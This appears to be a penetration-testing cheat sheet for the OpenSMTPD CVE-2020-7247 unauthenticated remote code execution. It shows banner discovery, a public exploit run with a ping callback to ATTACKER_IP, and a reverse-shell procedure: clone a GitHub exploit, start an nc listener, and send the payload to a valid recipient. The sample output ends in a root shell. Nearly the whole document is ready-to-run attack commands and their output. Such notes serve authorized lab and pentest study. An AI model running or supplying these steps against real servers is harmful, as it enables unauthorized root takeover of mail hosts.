# OpenSMTPD

OpenSMTPD on TCP/25 can be vulnerable to CVE-2020-7247 unauthenticated RCE.

## Discovery

Look for OpenSMTPD in the SMTP banner or Nmap service output:

```bash
telnet TARGET 25
```

Useful indicators:

```text
25/tcp open  smtp  OpenSMTPD
220 HOSTNAME ESMTP OpenSMTPD
214-2.0.0 This is OpenSMTPD
```

## CVE-2020-7247 RCE

Exploit-DB 47984 can confirm command execution with an ICMP callback:

```bash
sudo tcpdump -i tun0 icmp
python3 exploit.py HOSTNAME 25 'ping -c 4 ATTACKER_IP'
```

Expected exploit output:

```text
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

Expected callback:

```text
IP HOSTNAME > ATTACKER_IP: ICMP echo request
IP ATTACKER_IP > HOSTNAME: ICMP echo reply
```

## Reverse Shell

The `f4T1H21/CVE-2020-7247` exploit worked with a valid local recipient. In the observed successful path, `root@HOSTNAME` was accepted by the server.

```bash
git clone https://github.com/f4T1H21/CVE-2020-7247.git
cd CVE-2020-7247
nc -nlvp 80
python3 exploit.py HOSTNAME 25 'root@HOSTNAME' ATTACKER_IP 80
```

Successful exploit output:

```text
[+] Opening connection to HOSTNAME on port 25: Done
[+] Target port is running OpenSMTPD!
[+] Target is vulnerable!
[+] Checking the mail address: Valid
[+] Sending the payload: Done
```

Successful shell:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP]
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
root@HOSTNAME:~#
```

## References

- https://www.exploit-db.com/exploits/47984
- https://github.com/f4T1H21/CVE-2020-7247
